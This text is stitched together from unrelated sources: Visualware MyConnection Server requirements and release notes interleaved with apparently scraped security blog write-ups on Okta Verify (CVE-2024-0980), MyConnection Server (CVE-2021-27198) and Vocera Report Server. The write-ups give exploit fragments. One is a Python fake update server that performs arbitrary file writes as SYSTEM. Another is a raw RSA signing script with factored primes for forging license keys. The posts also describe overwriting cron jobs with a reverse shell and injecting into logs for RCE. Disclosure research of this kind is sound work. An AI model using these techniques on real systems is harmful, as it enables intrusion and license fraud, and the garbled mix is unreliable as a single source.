## Requirements

#### MCS Management Server

* OS: Linux or Windows Server

+ Linux: kernel 2.2.5 and above, RedHat 7.6 and above, and most other popular Linux distributions (Ubuntu, CentOS etc.), Intel x86 architecture only. MCS also supports AWS and Azure Linux services. Must be root to install, but not to run product.
+ Windows Server 2012-2019

* Java: 32-bit (Windows) or 64-bit (Linux) Oracle JRE is recommended (not JDK)
* System - Physical Server or Virtual:

+ Recommended: 2 GHz CPU 4+ core x64, 500GB free disk, 16-32 GB memory
+ Minimum: 2 GHz CPU 2-4 cores x32/x64, 500GB free disk, 8-16 GB memory

* MCS Database: Average storage is 2 GB per 10,000 tests

#### MCS Satellite Servers (SW)

* OS: Linux or Windows Server

+ Linux: kernel 2.2.5 and above, RedHat 7.6 and above, and most other popular Linux distributions (Ubuntu, CentOS etc.), Intel x86 architecture only. MCS also supports AWS and Azure Linux services.
+ Windows Server 2012-2019

* Java: 32-bit (Windows) or 64-bit (Linux) Oracle JRE is recommended (not JDK)
* System - Physical Server or Virtual:

+ Minimum: 2 GHz CPU 2-4 cores x32/x64, 250GB free disk, 8 GB memory if dedicated (16GB+ if shared)

#### MCS Quality Test Satellite Servers, Rack Mount Appliances (HW)

* Available with up to 16 ports, each Port includes a Satellite Server license
* Power: external power supply or PoE
* Specifications: [Datasheet](https://myconnectionserver.visualware.com/resources/datasheets/mcs_asa.pdf)

#### MCS Client Satellites (for automated testing from remote systems)

* OS: Windows 7-10, Windows Server 2008-2019, Mac OS X 10.11+ (El Capitan), Linux
* System: 4+ GB memory

#### Client Browser Support

MCS in-browser testing solutions are only officially supported by the mainstream browsers listed below:

* **Google Chrome, Microsoft Edge, Safari, and Firefox**

Internet Explorer and other less mainstream browsers may still work but are not officially supported.

#### Virtual Servers

MCS may be run on a virtual server. However a small number of users have experienced erroneous jitter reports due to an inaccurate timer on a virtual server. If you are planning to utilize the VoIP test, we recommend an initial validation of the results by comparing jitter test results from MCS on a dedicated server and the virtual server.

#### Java Requirements

> MyConnection Server (MCS) version 10 or above no longer requires Java to be present on any client computer. MCS does require Java on the server platform. If installing on Linux then most popular platforms already have the Oracle Open JDK installed. Visualware fully supports the Oracle Java Open JDK. MCS requires the Java Runtime Environment (JRE) and version 8 or above is recommended. Please note other Java versions from Oracle, such as Java SE, may require an additional Java support license from Oracle. Please review [java.com](https://www.java.com/en/download/) for more information on Oracle license requirements, Java Open JDK and any additional license requirements for Java SE releases.
>
> To validate the Oracle Java version in use:-
>
> * Open a command prompt
> * type **java -version** and press the enter key
> * The Oracle JVM version will be reported if present
>
> It is recommended that you keep the Java VM up to date with Oracle releases. Keep in mind that Java is no longer required in the client.

#### SQL Database API (optional)

> MCS includes a proprietary database that automatically logs all test results. Use of the API requires a licensed external SQL database:
>
> > **MySQL**: Download Connector/J from the MySQL web site.
> >
> >
> >
> > **Microsoft SQL Server**: Download the SQL Server JDBC from the Microsoft web site.

#### Port Requirements

> The default ports for the various MyConnection Server test types are listed below. The ports can be changed if needed in the MCS server configuration page.
>
> > **MySpeed**: TCP, ports 20000, 20001
> >
> > **MyVoIP**: UDP, ports 20000, 20001, TCP port 5060 (SIP test)
> >
> > **MyCapacity**: UDP, port 8090
> >
> > **MyRoute**: ICMP outbound - echo request; ICMP inbound - TTL expired in transit, Echo reply
> >
> > **MyFirewall**: UDP/TCP, these ports (or port ranges) are set in the 'custom test' option
>
> MyConnection Server includes a web engine which normally runs on HTTP port 80, although it can run on other ports. If MCS is to coexist on a server with IIS and you want MCS to run on port 80, see: stop IIS port grab.

Okta Verify for Windows Remote Code Execution â CVE-2024-0980
![](https://www.securifera.com/wp-content/uploads/2024/04/okta_blog_small.jpg "okta_blog_small")
### **This article is in no way affiliated, sponsored, or endorsed with/by Okta, Inc. All graphics are being displayed under fair use for the purposes of this article.**

## Poppin shells with Okta Verify on Windows

### These days I rarely have an opportunity to do bug hunting. Fortunately, over the holiday break, I found some free time. This started as it usually does with me looking at what software was running on my computer.

![](https://www.securifera.com/wp-content/uploads/2024/04/okta_icon.png "okta_icon")
### A while back I had installed Okta Verify on my Windows box as it was required for some âenhancedâ 2FA that I was required to have to access a thing. Months later it sat there doing whatever it does. I googled to see if Okta had a bug bounty program because even though I had some time, itâd be nice to get paid if I found a thing. I was thrilled to find that Okta had a bug bounty with Bugcrowd, Okta Verify is in it, and the payouts look good, almost ***too*** good.

![](https://www.securifera.com/wp-content/uploads/2024/04/bounties.jpg "bounties")
### I started with my usual bug hunting flow when approaching a random Windows service. This typically includes looking for the usual low hanging fruit. A good article for the types of things to look for can be found [here](https://itm4n.github.io/windows-dll-hijacking-clarified/).

### Firing up Sysinternalâs Procmon, I saw there is a service called Okta.Coordinator.Service that is running as SYSTEM. Without going into the details *(**namely because Okta hasnât fixed it or issued it a CVE**),*I found a thing. I submitted the report and was promptly paid.

![](https://www.securifera.com/wp-content/uploads/2024/04/okta_bug.png "okta_bug")
### Well thatâs weird. The bug I submitted is an unequivocal 7.8 CVSS. Which without knowing the voodoo behind P ratings (P1-P4), seems like would be a P2 at least. Instead I get a P3 and paid out at the lower end.

### Looking back on it, Iâm betting this is probably an old bug bounty program trick to motivate researchers to dig deeperâ¦ because, it worked. I decided to take a closer look since I hadnât even opened up the binary to see what it was doing â ***and I wanted to get that big payout***.

## Letâs Get Crackinâ

### I havenât popped Okta.Coordinator.Service.exe into a disassembler yet, but Iâm betting itâs a .NET application. My guess comes from its name and the fact that thereâs an Okta.Coordinator.Service.exe.config file right there with it, which you usually see with .NET applications.

![](https://www.securifera.com/wp-content/uploads/2024/04/okta_files.png "okta_files")
### When I open up the executable in JetBrains dotPeek, I can confirm it is indeed a .NET application. The binary appears to be a service wrapper. It handles the service related functionality: install, uninstall, start, stop, etc.Â  It references a Okta.AutoUpdate.Executor class that just so happens to have a matching DLL in the same directory.

![](https://www.securifera.com/wp-content/uploads/2024/04/dot_peek.png "dot_peek")
### Moving on to the DLL in dotPeek, I found the code used by the service. The first thing I noticed was it sets up a NamedPipe server, which listens for commands to update the Okta Verify software. This is a common design paradigm in Windows for enabling low-privileged applications to communicate with a high-privileged service to perform updates, as these often require elevated privileges. Itâs a complex mechanism thatâs tricky to do right, and often a good place for finding bugs. I was able to confirm the existence of the named-pipe server with a little Powershell.

![](https://www.securifera.com/wp-content/uploads/2024/04/np.jpg "np")
### Next, I investigated how to initiate an update and what aspects of this process could be manipulated by an attacker. The handler for the named pipe processes a straightforward JSON message that includes several fields, some checked against expected values. The primary field of interest is the update URL. If the input data passes validation, the software will attempt to fetch details from the specified URL about the most recent update package available. As shown below, the URL (sub)domain is verified against a whitelist before proceeding. For now, Iâll avoid trying to meet/bypass this requirement and simply add an entry in the hosts file on my test machine.

![](https://www.securifera.com/wp-content/uploads/2024/04/validate.jpg "validate")![](https://www.securifera.com/wp-content/uploads/2024/04/trusted_domains.jpg "trusted_domains")
### Typically at this stage, Iâd code up a proof of concept (POC) to send a JSON message to the named pipe and check if the software connected to a web server I control. But since I havenât spotted any potential vulnerabilities yet, I skipped that step and moved on.

### From here I took a look at the code responsible for processing the JSON message retrieved from the attacker controlled update server. The application is expecting a message that contains metadata about an update package including versioning and an array of file metadata objects. These objects contain several pertinent fields such the download URL, size, hash, type, and command line arguments. The provided download URL is validated with the same domain checking algorithm as before. If the check passes, the software downloads the file and writes it to disk. ***This is where things get interesting***. The code parses the download URL from the received metadata and constructs the file path by calling the **Path.Combine** function.

![](https://www.securifera.com/wp-content/uploads/2024/04/path_combine_arb_file_write.png "path_combine_arb_file_write")
### Several factors are converging here to create a serious vulnerability. The most obvious is the use of the **Path.Combine** function with user supplied data. I went into depth about this issue in a previous blog post [here](https://www.securifera.com/blog/2023/03/06/attacking-net-web-services/). The TLDR is if a full path is provided as the second argument to this function, the first argument that typically specifies the parent folder, is ***ignored***. The next issue is how the filename is parsed. The code splits the file location URL by forward slash and takes the last element as the filename. The problem (solution) is a full Windows path can be inserted here using back slashes and itâs still a valid URL. Since the service is running as SYSTEM, we have permissions to right anywhere. If we put all this together our payload looks something like the script below.

Copy to ClipboardSyntax Highlightersha256\_hash = hashlib.sha256()
sha256\_hash.update("AAAAA")
lib\_hash = sha256\_hash.hexdigest()
payload\_name = "test.txt"
class CustomRequestHandler(http.server.BaseHTTPRequestHandler):
def do\_GET(self):
if self.path.startswith('/api'):
# Handle GET requests here
json\_data = {
"version": "5.0.0",
"files": [
{
"href": "https://test.okta.com/C:\\%s" % payload\_name,
"size": len(payload),
"hashValue": "abcd1234",
"type": "Document",
"fileHashes": {
"SHA256": lib\_hash
},
"commandArgs": "",
"requiresElevatedInstall": True
},
### Now that I have a potential bug to test out, I craft the POC for the named pipe client to trigger the update. Luckily, this code already exists in the .NET DLL for me to repurpose.Â  With my web server code also in place I send the request to test out the file write. As I had hoped, the file write succeeds!

![](https://www.securifera.com/wp-content/uploads/2024/04/test.jpg "test")
## Cool, but what about impact!

### I have the ability to writeÂ arbitraryÂ files as SYSTEM on Windows. How can I leverage this to achieve on-demand remote code execution? The first thing that comes to mind is some form of [DLL hijacking](https://www.crowdstrike.com/blog/4-ways-adversaries-hijack-dlls/). Iâve used phantom DLL hijacking in the past but this is more appropriate for red team operations where time constraints arenât really an issue. What I really need is the ability to force execution shortly after the file write.

###

### Since the whole purpose behind this service is to install an update, can I just use it to execute my code? I reviewed the code after the file write to see what it takes to execute the downloaded update package. It appears the file type field in the file object metadata is used to indicate which file to execute. If the EXE or MSI file type is set, the application will attempt to validate the file signature before executing it, along with any supplied arguments. The process launcher executes the binary with UseShellExecute set to false so no possibility of command injection.

###

### My original thought was to deliver a legitimate Okta Verify package since this would pass the signature check. I could then use ProcMon to identify a DLL hijack in the install package. Privileged DLL hijacks occur in almost all services because the assumption is you already require the permissions to write to a privileged location. Ironically though, I found the service binary actually contained a DLL hijack just prior to the signature verification to load the necessary cryptographic libraries. If I write a DLL to **C:\Program Files (x86)\Okta\UpdateService\wintrust.dll**, it will get loaded just prior to signature verification.

###

![](https://www.securifera.com/wp-content/uploads/2024/04/relative_DLL_import-1.png "relative_DLL_import (1)")
### Great, so now I have a way to execute arbitrary code from an unprivileged user to SYSTEM. ***âGuessingâ***that this probably wonât meet the bar of P1 or P2, I start thinking of how to upgrade this to remote code execution. If RCE doesnât get a P1 then what does? The interesting thing about named pipes is that they are often remotely accessible. It all depends on what permissions are set. Looking at the code below, it sets full control to the âBUILTIN\Usersâ group.

![](https://www.securifera.com/wp-content/uploads/2024/04/perms.jpg "perms")
### Testing from a remote system in my network confirms that I get permissioned denied when I try to connect to the named pipe. After a couple of days I had an idea. If a Windows system is part of a Active Directory domain, does the BUILTIN/Users group permissions automatically get converted to the âDomain Usersâ group in a domain? This would mean any user in an AD domain could remotely execute code on any system that has Okta Verify installed. Moreover, considering that this software is aimed at large corporate enterprises, it would likely be included in the standard build and deployed broadly. So not explicitly âDomain Adminâ but a good chance of it. I had to find out, so I stood up a test AD network in AWS and the following video shows what happened.

## Almost done

### Well that seems like a big deal right? Maybe get a P1 (and 70kâ¦)? Iâm guessing the ***small detail*** about not having an Okta subdomain to download from may keep it from landing a P1. Having worked at big tech companies, I know that subdomain takeover reports are common. However, without having a subdomain takeover, itâs likely the bugâs significance will be minimized. I decided to dedicate some time to searching for one to complete the exploit chain. After going through the standard bug bounty subdomain takeover tools, I came up with only one viable candidate: oktahelpspot.okta.com.Â  It pointed to an IP with no open ports, managed by a small VPS provider named Arcustech.

### After signing up for an account and some very innocent social engineering, I got the following response. And then a second email from the first personâs manager. Oh well, so much for that.

![](https://www.securifera.com/wp-content/uploads/2024/04/email11.jpg "email11")![](https://www.securifera.com/wp-content/uploads/2024/04/email2.jpg "email2")
### The next thing that came to mind was leveraging a custom Okta client subdomain. Whenever a new client registers with Okta, they receive a personalized Okta subdomain to manage their identity providers, e.g. trial-XXXXXXX.customdomains.okta.com. I found a way to set custom routes in the web management application that would redirect traffic from your custom domain to a user defined URL.Â Unfortunately, this redirect was implemented in Javascript, rather than through a conventional 302 or 301 HTTP redirect. Consequently, the .NET HTTP client that the Okta Verify update service uses did not execute the Javascript and therefore did not follow the redirect as a browser would.

## Reporting

### At this point, I decided it was time to report my findings to Okta. Namely, because they were offering a bonus at the time for what appeared to be Okta Verify, which I think they might have either forgotten or included without mentioning. Secondly, I didnât want to risk someone else beating me to it. I am happy to report they accepted the report and awarded me a generous bounty of $13,337 as a P2. It wasnât quite $70k, or a P1, but itâs nothing to sneeze at. I want to thank Okta for the bounty and quick resolution. They also kindly gave me permission to write this blog post and followed through with issuing CVE-2024-0980 along with an [advisory](https://trust.okta.com/security-advisories/okta-verify-windows-auto-update-arbitrary-code-execution-cve-2024-0980/).

### One last note, if anyone reading this identifies a way to bypass the subdomain validation check I would be very interested. I attempted most of the common URL parsing confusion techniques as well as various encoding tricks all for naught. Drop me a line at [@rwincey on X](https://twitter.com/rwincey)

### 11.0a, September 4th, 2020 (build 5237)

* **PERFORMANCE**: Vast memory usage improvement to the Satellite protocol
* **PERFORMANCE**: Efficiency improvements for MCS data retrieval

### 11.0a, June 27th, 2020 (build 5211)

* **NEW**: Advanced data publishing system (requires license) for automated reports such as VoIP assessment or throughput assessment. Supports automated report generation and distribution. The system interfaces to the testing process to automatically generate reports when the testing has completed. ([learn more](/support/v11/userguide/ug-publishing.html#mainugdiv))
* **NEW**: Business Calendar. The business calendar allows testing and reporting to integrate into business timetables, end-of-week report or run a capacity test at 3 am on Sunday([learn more](/support/v11/userguide/manage-calendar.html#mainugdiv))
* **NEW**: Work Order Actions. Satellite work orders can now be set up to initiate an action(s) on completion of a work order or part work order. Actions deliver the flexibility for work order data collection to automatically interface to assessment report publication. ([learn more](/support/v11/userguide/mcs-actions.html#mainugdiv))
* **NEW**: Behavioral Testing. Automated test processing now supports the ability to synchronize remotely distributed satellites. This interface allows a network to be tested across any size of enterprise. For example, a 1000 concurrent VoIP call simulation could be configured to run 100 G711 concurrent call simulations from 10 call center locations at the same time. Network behavioral testing allows the network configuration and policies to be challenged at any level of bandwidth including the integration of competing traffic to assess application coexistence, such as a heavy download or other data traffic. ([learn more](/resources/casestudies/sync-timer-assessment.html))
* **NEW**: User and work order accounts. Automated assessment testing can now be directed to run under an account ownership structure. The application of the account structure allows data to be partitioned by user or business project.
* **NEW**: Web-socket testing. MCS 11 supports the ability to run a basic data test administered only by the browser with no plug-in. Advanced protocol testing such as accurate RFC6349 data, VoIP, Route, Firewall, Capacity etc. naturally requires a plug-in. It should be noted that, as the browser is the initiator of the data transfer, any web-socket compliant test results will vary based on the performance of the browser used.

CVE-2021-27198[b0yd](https://www.securifera.com/blog/author/b0yd/ "Posts by b0yd")2022-08-12T20:52:23+00:00
## SUMMARY

### The following vulnerability wasÂ found in [VisualWare MyConnection Server](https://myconnectionserver.visualware.com/download.html%20) 11.0 â 11.0b.

### An unauthenticated remote code execution vulnerability was discovered in Visualware MyConnection Server 11.0 through 11.0b build 5382. The web endpoint at âhttps://example.com/myspeed/sfâ provides an unauthenticated user the ability to upload an arbitrary file to an arbitrary location via a specially crafted POST request. This application is written in Java and is thus cross-platform. The Windows installation executes the web server as SYSTEM which means that exploitation provides Administrator privileges on the target system.

CVE-2021-27198
![](https://www.securifera.com/wp-content/uploads/2023/10/file_upload.jpg "file_upload")
### **This article is in no way affiliated, sponsored, or endorsed with/by Visualware, Inc. All graphics are being displayed under fair use for the purposes of this article.**

## **Revisiting an Old Bug: File Upload to Code Execution**

### A colleague recently contacted me about a [bug](https://www.securifera.com/advisories/cve-2021-27198/) I discovered a couple of years ago (CVE-2021-27198). The vulnerability was an unauthenticated arbitrary file upload issue in version 11.0 to 11.0b of the [Visualware MyConnection Server](https://myconnectionserver.visualware.com/download) software. At the time I hadnât actually proven remote code execution even though I rated it as critical. So when my colleague asked me how I exploited it, I felt like I had to show it was possible. This endeavor proved to be both challenging and enlightening so I thought Iâd share the experience.

### The MyConnection Server software is coded in Java and intended to work seamlessly across different platforms. In this case, the arbitrary file write was privileged, granting the file server elevated permissions, with SYSTEM on Windows and root on Linux. With a privileged file write, achieving code execution is often straightforward. This [post](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html) by Doyensec outlines the most common approaches, which can be broadly categorized into two groups: web application-specific and operating system-specific. Web application-specific methods involve seeking ways to initiate execution within the web server process. Examples include uploading web framework configuration files or web application source code. On the other hand, operating system-specific techniques involve finding execution triggers controlled by the operating system itself, such as services, scheduled tasks, cron jobs, and so on.

### Regrettably, in the case of this particular bug, I cannot directly target the web server itself since itâs a pure Java implementation, as opposed to using a web server framework like Apache or Nginx. As a result, our focus will primarily shift towards exploring operating system-specific possibilities or more innovative approaches.

## **Windows RCE**

### With this in mind, I began researching possible techniques for achieving code execution solely through a file write. In the Windows environment, my usual strategy would involve targeting vulnerable applications susceptible to traditional DLL hijacking or [phantom DLL hijacking](https://www.crowdstrike.com/blog/4-ways-adversaries-hijack-dlls/), leveraging the privilege granted by such writes.

### I opened up [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) Procmon tool and began looking for âNAME NOT FOUNDâ or âPATH NOT FOUNDâ results for CreateFile. I usually look for instances of executables or DLLs. While looking through the results, I noticed that every minute the MCS java process is attempting to open several ârtapluginâ JAR files, some of which do not exist.

![](https://www.securifera.com/wp-content/uploads/2023/10/prcomon2.png "prcomon2")
### Based on the output, it looks like the server is dynamically loading these JARs from disk into the java process. If this is the case, I may be able to get arbitrary code execution by simply placing a custom JAR file in a specific place on the file system. I decided to open up the MCS JAR in [JD-GUI](http://java-decompiler.github.io/) to investigate.

### When I searched for ârtapluginâ, I found a class named RTAPlugin that has a function that appears to load a file from disk, create a custom ClassLoader, loads a class from the file, and then creates a new instance of the class. This is exactly what I need!

![](https://www.securifera.com/wp-content/uploads/2023/10/load_jar.png "load_jar")
### To confirm execution, I created a simple POC that executes calc.exe when an instance of the class is created.

![](https://www.securifera.com/wp-content/uploads/2023/10/payload1.png "payload1")
### I then just manually copied the JAR into the appropriate directory to see if it was loaded. I was thrilled to see that it worked! Now I just needed to test it using the file upload vulnerability.

![](https://www.securifera.com/wp-content/uploads/2023/10/calc.png "calc")
### I loaded up Burp and pasted in the JAR file as the body of the file upload request. Unfortunately when I sent it over, I didnât see calc.exe in the process list.

![](https://www.securifera.com/wp-content/uploads/2023/10/burp_req.png "burp_req")
### When I opened up the log file for the MyConnection server, I found the following exception was thrown when attempting to unzip the JAR.

![](https://www.securifera.com/wp-content/uploads/2023/10/crc.jpg "crc")
### I took the original JAR payload and diff-ed it against the one that was uploaded into the rtaplugin directory. I found that certain bytes were getting corrupted. I opened up JD-GUI again to take a closer look at the code that performed the file write.

![](https://www.securifera.com/wp-content/uploads/2023/10/file_write.jpg "file_write")
### What wasnât immediately obvious (at least to me) was that there was an implied encoding/decoding that was happening with the calls to String.valueOf and String.getBytes. As a result, certain ranges of bytes were getting corrupted. On Windows I found that bytes between 0x80 and 0x9f were being replaced with other values. This meant I had to do some bit fiddling to get the payload to work.

### After doing a little bit of googling, I found a [CTF writeup](https://hackmd.io/%40ptr-yudai/S1LWYdOm9) by Yudai Fujiwara that faced a similar encoding problem. The writeup provided code for generating a zip file that only contained bytes in the ASCII range, 0x0 â 0x7f. The script primarily focused on two structures in the zip protocol that needed to be free of non-ascii bytes, the CRC for zipped files, and any length fields.

### The script brute-forces a valid ASCII value for the CRC field by iteratively modifying the inner file. In the CTF challenge, the zipÂ  contained an ASCII script, whereas a JAR contains a binary class file. I updated the algorithm to perform a similar modification to the Java source, and then recompile the Java class file on each iteration to make the CRC update.

# Update needle

### After creating the ascii-zip payload, I uploaded it using the vulnerable endpoint. As hoped, it was loaded and executed as SYSTEM on the target server. To keep from having to recompile a JAR to execute different commands, I generated a JAR that would execute a script at a known location. I could then separately upload that script with a new command whenever I wanted command execute. I added the âsetExecutableâ directive to ensure it worked on Linux as well.

![](https://www.securifera.com/wp-content/uploads/2023/10/payload2.jpg "payload2")
## **Linux RCE**

### When dealing with Linux-based operating systems, one of the primary challenges when exploiting arbitrary file write vulnerabilities is ensuring that file permissions are correctly configured. Even if a file is executed, it wonât function if it isnât marked as executable. To overcome this obstacle, I am targeting files that already have the execute bit set.

### As I had anticipated, demonstrating exploitation on Linux turned out to be quite straightforward by simply overwriting scripts within the /etc/cron.\* directories. On Red Hat distributions, you can achieve relatively timely execution by overwriting the /etc/cron.hourly/0anacron script. The drawback to targeting cron jobs is there is no guarantee specific scripts exist, and overwriting them can cause system instability.

###

![](https://www.securifera.com/wp-content/uploads/2023/10/0anacron.png "0anacron")
### Assuming outbound network connectivity isnât blocked, a [simple reverse shell](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux) is likely the simplest payload to put in the cron job. If that doesnât work, the cron job can be modified to contain a base64 encoded copy of the unmodified rtaplugin JAR that is then copied to the correct directory. The same technique as described above can then be used to get repeated code execution by uploading different versions of the script to***/tmp/b.bat***.

###

## **No License, No Wurk!**

### After all the effort put in to develop the rtaplugin exploit, I was disappointed to find out that rtaplugins (and the associated thread that loads them periodically) are only active when the web server has a valid license. I wasnât aware of this because my test instance was still within its trial phase. I decided to take another look and see if our privileged file write vulnerability (CVE-2021-27198) can be used once again, but this time to trick the server into thinking it is licensed. The hope here is to find a file or database entry that can modified with our file upload exploit to bypass licensing.Â  **I want to be sure to clarify here, nothing I will describe here can be used to subvert or crack the license for this software on a fully patched system. The goal is to use our already privileged file system access to bypass any license checks.**

### When you navigate to the web application home page, youâll see a menu on the left that contains a link to âLicensingâ. Itâs safe to assume this is the right place to look.

![](https://www.securifera.com/wp-content/uploads/2023/10/license.png "license")
### Sadly, when you click on it, youâre presented with the login page. If youâre fortunate and the password for the admin user hasnât been changed, the next page youâll encounter is shown below.

![](https://www.securifera.com/wp-content/uploads/2023/10/login.jpg "login")
### If youâve made it this far, or happen to guess some credentials, you will have sufficient permissions to access the server licensing endpoint. Thereâs not much to go on in regards to the format of the expected key other than the hint that it starts with MCS.

![](https://www.securifera.com/wp-content/uploads/2023/10/licensing.png "licensing")
### I opened up the JAR again and tracked down the code responsible for handling the license activation. The handler performs a series of checks and transforms before making a web request to a visualware domain to verify the license.

![](https://www.securifera.com/wp-content/uploads/2023/10/http_verify2.jpg "http_verify2")
### If that fails (by exception), the server then attempts to validate the license by sending a specially crafted DNS request.

![](https://www.securifera.com/wp-content/uploads/2023/10/dns_verify.jpg "dns_verify")
### Leveraging the privileged file write capability of CVE-2021-27198, there are several methods at my disposal for circumventing the licensing without having to decipher the licensing key directly. As the software initiates a network request to validate the entered key, it can be rerouted to a server under my control to authenticate the supplied key.

### The most straightforward method to achieve this is by modifying the hosts file, a file which contains mappings of IP addresses to hostnames, and is typically the first location an operating system checks when resolving a hostnameâs IP address. On Windows systems, you can find this file at ***C:\Windows\System32\drivers\etc\hosts***, and on \*nix systems, itâs located at ***/etc/hosts***. To manipulate the license verification process, I can simply insert a new entry into the hosts file, directing the license server domain to the IP address of a server under my control.

![](https://www.securifera.com/wp-content/uploads/2023/10/hosts.png "hosts")
### An alternative approach, specific to \*nix systems, involves altering the /etc/resolv.conf file, which specifies the DNS serverâs IP address used for domain resolution. By changing the DNS server address to a server that I manage, I can ensure that any DNS requests for the license server are resolved to my fake license serverâs IP address.

### **WARNING: It should be noted that overwriting the /etc/hosts or /etc/resolv.conf file can cause system instability if certain configurations are expected to properly resolve custom DNS entries or resolvers.**

### My next step is to trace back the activate function to the web endpoint that can trigger it. Unfortunately, it appears the key entered into the web form is not the same format as what is sent to the license server. After performing a couple string-based checks, a validate function is called on the provided license key. If you look at the function closely, it may look familiar. It appears to be implementing a handcrafted version of RSA.

![](https://www.securifera.com/wp-content/uploads/2023/10/rsa.png "rsa")
### From a security standpoint, the rationale behind requiring an encrypted license key as the input into the web application doesnât make sense. First and foremost, since the unencrypted license key is subsequently transmitted over the network, unencrypted, it can easily be captured with a tool like Wireshark. Secondly, the actual license key is verified on the vendorâs server so deducing how the license key is generated is impractical. Unfortunately for me however, this has introduced a minor obstacle in reaching the network activation function detailed in the previous section.

### The astute reader may have already noticed an interesting detail about the RSA parameters. That public key looks awful small. Just barely over 256 bits.Â It appears our CTF challenge continuesâ¦ (oh wait this is real software).

![](https://www.securifera.com/wp-content/uploads/2023/10/pub.jpg "pub")
### For those imposters in the infosec community that claim playing CTF doesnât provide real world experience, I can confidently say youâve never hunted real bugs. All too often I come across exploit chains that appear as if someone neatly setup each primitive for me to uncover. I personally donât spend a ton of time attempting crypto challenges when playing CTFs, mostly because Iâm not smart enough. Luckily for me, this example would fit nicely into the babyâs first category. With such a small public key, I should be able to find a CTF writeup that guides me through the process of breaking it down into its two prime numbers. A few searches later I found an [article](https://yurichev.com/news/20220210_RSA/) by Dennis Yurichev that demonstrates using a tool called [CADO-NFS](https://cado-nfs.gitlabpages.inria.fr/) to do just that. After about 5 mins I was presented with the answer.

![](https://www.securifera.com/wp-content/uploads/2023/10/cado.png "cado")
### With the two prime numbers in hand, I attempted to reconstruct the private key using the script provided in Yurichevâs post. Unfortunately, the RSA crypto libraries in python didnât play well with the provided primes. Namely because the block size rounded up to 257 bits and it complained about truncation. I also discovered that the serverâs custom RSA implementation didnât implement padding. To get around these issues I wrote code to perform the calculations manually rather than using a crypto library.

Copy to ClipboardSyntax Highlighterfrom Crypto.Util.number import bytes\_to\_long
from Crypto.Util.number import inverse
def encrypt\_with\_private\_key\_raw(data):
p = 624106295606602100995951586143562696483
q = 264089186086669371634156709929132346711
e = 17
n = p \* q
phi = (p - 1) \* (q - 1)
d = inverse(e, phi)
# Convert data to an integer and perform raw RSA encryption
m = bytes\_to\_long(data)
ciphertext = pow(m, d, n)
return ciphertext
### I used my script to generate an encrypted blob with the derived RSA private key and fired off a web request with a finished license key. Keep in mind, since Iâve already overwritten the hosts file, I only need to pass the decryption checks as the key will not be transmitted to the vendorâs server for verification. To my delight, it works!

## **Conclusion**

### My journey to developing a working exploit for CVE-2021-27198 finally comes to an end. What started as a simple exercise turned into quite an endeavor. For anyone interested, Iâve uploaded my exploit [here](https://github.com/rwincey/CVE-2021-27198).

Vocera Report Server Pwnage
![](https://www.securifera.com/wp-content/uploads/2023/04/vocera.png "vocera")
### **This article is in no way affiliated, sponsored, or endorsed with/by Vocera Communications or Stryker Corporation. All graphics are being displayed under fair use for the purposes of this article.**

## **Quest for RCE**

### Last year during a routine penetration test, our team came across a interesting target called Vocera Report Server while reviewing web endpoint screenshots.

![](https://www.securifera.com/wp-content/uploads/2023/04/vocera-1.png "vocera")
### A little research revealed that the â[Vocera Report Server software and the associated report console interface provide administrators, managers, and decision makers the ability to monitor system performance and generate reports for analysis](https://www.vocera.com/resource/data-sheets/vocera-report-server)â for the Vocera Communication System. When we click on the âVocera Report Consoleâ link we are greeted with the following login page.

![](https://www.securifera.com/wp-content/uploads/2023/04/report_console.png "report_console")
### Step 1:Â  head over to Google to see if we can find any documentation that might list default credentials for the application. As luck would have it, this [page](https://pubs.vocera.com/vrs/vrs_5.2.2/docs/ReportGuide.pdf) comes up and kindly tells us what the default password would be.

![](https://www.securifera.com/wp-content/uploads/2023/04/login_pw.png "login_pw")
### Fortunately the system owner didnât change the password and we log right in. Once inside we start perusing the various endpoints to get a feel for what the application is used for. Right off, the first thing that stands out is the menu that is named âTask Schedulerâ. Clicking on the menu brings up a panel that appears to let you create tasks that will be executed.

![](https://www.securifera.com/wp-content/uploads/2023/04/task_scheduler.png "task_scheduler")
### After tinkering with the various tasks, it appears we can only edit existing tasks. We also canât seem to get arbitrary command execution or injection by modifying the existing entries. At this point we decided it would likely be more fruitful to move on to a white box approach and see what the code is actually doing. We reached out to a colleague to get us access to the server using some credentials they had cracked after pulling the hash with Responder.

### Since the application is written in Java, we open up the class files in [JD-GUI](http://java-decompiler.github.io/) to begin analyzing the function responsible for executing tasks. The first issue we notice is that the function that parses the user-controlled task execFileName attempts to retrieve the filename portion of the path by searching for the last occurrence of a backslash. Unfortunately in Java, forward slashes are automatically normalized into directory separators in a file path. This means we can traverse out of the intended directory.

![](https://www.securifera.com/wp-content/uploads/2023/04/exec_task.png "exec_task")
### While the path to the executable task is controllable, a check is performed that ensures that the file contains the word âjavaâ before executing. This means if we can control the contents of a file on disk, we can execute arbitrary commands.

![](https://www.securifera.com/wp-content/uploads/2023/04/java_check.png "java_check")
### How then do we get a file on disk that we control? What if we can affect the log file? It looks like if an exception happens when executing the task, a log entry is created.

![](https://www.securifera.com/wp-content/uploads/2023/04/vocera_log.png "vocera_log")
### Sure enough, if we specify a task execfilename that doesnât exist, an entry is created in the log file that also includes the task parameters that we can inject arbitrary data. With a little creativity, we are able to inject arbitrary commands and then point to the log file using the directory traversal to achieve remote code execution.

![](https://www.securifera.com/wp-content/uploads/2023/04/code_exec.png "code_exec")
## **Can we do better?**

### With a path to execute arbitrary commands identified, we shifted our focus to finding a way to accomplish the same thing but without having to authenticate first. While investigating the task execution code in the previous exercise, we noticed there is a websocket interface that the web server communicates with when executing a task. After some testing it was determined that this interface was unauthenticated. In addition to the ârunTaskPageâ function mentioned above, there are a few other operations that appear to be related to database management functions that are worth investigating.

![](https://www.securifera.com/wp-content/uploads/2023/04/ws_funcs.png "ws_funcs")
### If we look at the code for the restoreSqlData operation we see that it executes a bat file that in turn executes another Java JAR. Inside that JAR, the function that handles the restoreSqlData operation parses the âuploadFileâ parameter and appends it to the local âbackupDirâ. This instance is also vulnerable to directory traversal like the one mentioned previously.

![](https://www.securifera.com/wp-content/uploads/2023/04/sql_dirtrav.png "sql_dirtrav")
